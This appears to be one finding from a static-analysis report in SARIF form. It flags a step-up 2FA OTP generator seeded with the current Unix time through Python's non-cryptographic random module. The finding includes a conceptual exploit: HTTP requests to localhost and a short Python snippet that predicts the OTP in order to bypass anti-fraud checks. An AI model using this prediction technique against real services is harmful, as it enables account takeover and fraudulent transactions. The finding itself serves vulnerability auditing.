          "ruleId": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
          "level": "error",
          "message": {
            "text": "Predictable Seed and Weak PRNG in Step-Up OTP Challenge Generator: Data Path Analysis:\n- Source: Route `POST /api/v1/risk/challenge` receives `accountId` and `transactionRef` to generate a 2FA step-up challenge OTP.\n- Sanitization/Validation: None.\n- Sink: Lines 19-21 seed the non-cryptographic `random` module with `int(time.time())`, resetting the PRNG state based on the current Unix epoch second. Because an attacker knows or can observe the approximate HTTP request arrival time (e.g., from the server's HTTP `Date` header), they can predict the exact seed `now_ts` and calculate `otp_code = str(random.randint(100000, 999999))` without access to the user's out-of-band communication channel. The attacker can then submit this predicted OTP to `POST /api/v1/risk/verify-challenge`, bypassing step-up anti-fraud protection for high-risk operations.\n\nConceptual Exploit Payload:\n1. Trigger OTP challenge:\n```http\nPOST /api/v1/risk/challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1001\",\n  \"transactionRef\": \"pay_pix_901\"\n}\n```\nReceive response: `{\"challengeId\": \"chal_abcd1234ef56\", ...}`.\n2. Locally calculate candidate OTPs using `int(time.time())` at request time:\n```python\nimport random, time\nnow = int(time.time())\nrandom.seed(now)\npredicted_otp = str(random.randint(100000, 999999))\n```\n3. Submit the predicted OTP:\n```http\nPOST /api/v1/risk/verify-challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"challengeId\": \"chal_abcd1234ef56\",\n  \"otpCode\": \"\u003cpredicted_otp\u003e\"\n}\n```\nThe server verifies the challenge, authorizing fraudulent high-value transactions."
